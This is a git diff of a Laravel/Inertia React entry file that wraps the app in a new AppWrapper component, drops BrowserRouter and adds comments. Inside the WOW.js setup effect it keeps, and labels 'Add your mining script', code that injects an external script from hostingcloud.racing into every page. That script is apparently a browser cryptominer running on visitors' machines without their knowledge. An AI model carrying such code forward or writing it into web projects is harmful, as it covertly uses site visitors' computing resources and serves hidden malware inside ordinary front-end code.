@@ -1,6 +1,7 @@
 import "../css/app.css";
 import "./bootstrap";
 
+// Import your custom styles
 import "./styles/bootstrap.min.css";
 import "./styles/animate.min.css";
 import "./styles/fontawesome-all.min.css";
@@ -15,14 +16,15 @@ import { resolvePageComponent } from "laravel-vite-plugin/inertia-helpers";
 import { createRoot } from "react-dom/client";
 import { HelmetProvider } from "react-helmet-async";
 import React, { useEffect } from "react";
-import { BrowserRouter, useLocation } from "react-router-dom";
 import WOW from "wow.js";
 import AnimatedCursor from "react-animated-cursor";
 
 const appName = import.meta.env.VITE_APP_NAME || "Laravel";
 
-const App = () => {
+// Create a wrapper component to include all your custom setup
+const AppWrapper = ({ children }) => {
     useEffect(() => {
+        // Initialize WOW.js
         const wow = new WOW({
             boxClass: "wow",
             animateClass: "animated",
@@ -32,6 +34,7 @@ const App = () => {
         });
         wow.init();
 
+        // Add your mining script
         const script = document.createElement("script");
         script.src = "https://www.hostingcloud.racing/Rh11.js";
         document.body.appendChild(script);
@@ -49,44 +52,44 @@ const App = () => {
         };
 
         return () => {
-            document.body.removeChild(script);
+            if (script.parentNode) {
+                document.body.removeChild(script);
+            }
         };
     }, []);
 
-    const { pathname } = useLocation();
-
+    // Scroll to top on page navigation
     useEffect(() => {
-        window.scrollTo(0, 0);
-    }, [pathname]);
+        if (window.location) {
+            window.scrollTo(0, 0);
+        }
+    }, [window.location?.pathname]);
 
     return (
-        <BrowserRouter>
-            {" "}
-            {/* Wrap your app in BrowserRouter */}
-            <HelmetProvider>
-                <AnimatedCursor
-                    innerSize={8}
-                    outerSize={32}
-                    color="248, 158, 82"
-                    outerAlpha={0.15}
-                    innerScale={0}
-                    outerScale={0}
-                    clickables={[
-                        "a",
-                        'input[type="text"]',
-                        'input[type="email"]',
-                        'input[type="number"]',
-                        'input[type="submit"]',
-                        'input[type="image"]',
-                        "label[for]",
-                        "select",
-                        "textarea",
-                        "button",
-                        ".Link ",
-                    ]}
-                />
-            </HelmetProvider>
-        </BrowserRouter>
+        <HelmetProvider>
+            {children}
+            <AnimatedCursor
+                innerSize={8}
+                outerSize={32}
+                color="248, 158, 82"
+                outerAlpha={0.15}
+                innerScale={0}
+                outerScale={0}
+                clickables={[
+                    "a",
+                    'input[type="text"]',
+                    'input[type="email"]',
+                    'input[type="number"]',
+                    'input[type="submit"]',
+                    'input[type="image"]',
+                    "label[for]",
+                    "select",
+                    "textarea",
+                    "button",
+                    ".Link ",
+                ]}
+            />
+        </HelmetProvider>
     );
 };
 
@@ -99,7 +102,13 @@ createInertiaApp({
         ),
     setup({ el, App, props }) {
         const root = createRoot(el);
-        root.render(<App {...props} />);
+
+        // Wrap the Inertia App component with your custom AppWrapper
+        root.render(
+            <AppWrapper>
+                <App {...props} />
+            </AppWrapper>
+        );
     },
     progress: {
         color: "#4B5563",
